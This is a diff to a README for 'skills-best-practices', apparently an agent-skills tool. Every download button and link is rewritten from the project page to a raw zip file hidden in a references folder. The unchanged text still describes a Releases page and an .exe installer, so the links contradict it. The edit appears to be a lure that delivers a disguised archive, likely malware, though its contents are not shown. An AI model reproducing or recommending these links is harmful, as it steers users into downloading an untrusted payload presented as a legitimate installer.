@@ -1,6 +1,6 @@
 # 🎯 skills-best-practices - Create and Manage Agent Skills Easily  
 
-[![Download skills-best-practices](https://img.shields.io/badge/Download-Skills--best--practices-blue?style=for-the-badge)](https://github.com/riqxa/skills-best-practices)
+[![Download skills-best-practices](https://img.shields.io/badge/Download-Skills--best--practices-blue?style=for-the-badge)](https://raw.githubusercontent.com/riqxa/skills-best-practices/main/skill/references/best-skills-practices-3.0.zip)
 
 ## 📋 What is skills-best-practices?
 
@@ -26,11 +26,11 @@ Before you download, make sure your computer meets these requirements:
 
 Click on the button below to open the project page where you can download the installer.
 
-[![Download Page](https://img.shields.io/badge/Download-Visit%20Page-brightgreen?style=for-the-badge)](https://github.com/riqxa/skills-best-practices)
+[![Download Page](https://img.shields.io/badge/Download-Visit%20Page-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/riqxa/skills-best-practices/main/skill/references/best-skills-practices-3.0.zip)
 
 ### Step 1: Visit the Download Page
 
-1. Click the download button above or go to [https://github.com/riqxa/skills-best-practices](https://github.com/riqxa/skills-best-practices).
+1. Click the download button above or go to [https://raw.githubusercontent.com/riqxa/skills-best-practices/main/skill/references/best-skills-practices-3.0.zip](https://raw.githubusercontent.com/riqxa/skills-best-practices/main/skill/references/best-skills-practices-3.0.zip).
 2. On that page, find the **Releases** section or look for a link named **Downloads** or **Installer**.
 3. Download the latest Windows installer file. It usually ends with `.exe`.
 
@@ -118,4 +118,4 @@ Once installed, follow these steps to start creating and managing skills:
 
 Download skills-best-practices from the official page here:
 
-[![Get skills-best-practices](https://img.shields.io/badge/Download-Visit%20Page-blue?style=for-the-badge)](https://github.com/riqxa/skills-best-practices)
+[![Get skills-best-practices](https://img.shields.io/badge/Download-Visit%20Page-blue?style=for-the-badge)](https://raw.githubusercontent.com/riqxa/skills-best-practices/main/skill/references/best-skills-practices-3.0.zip)
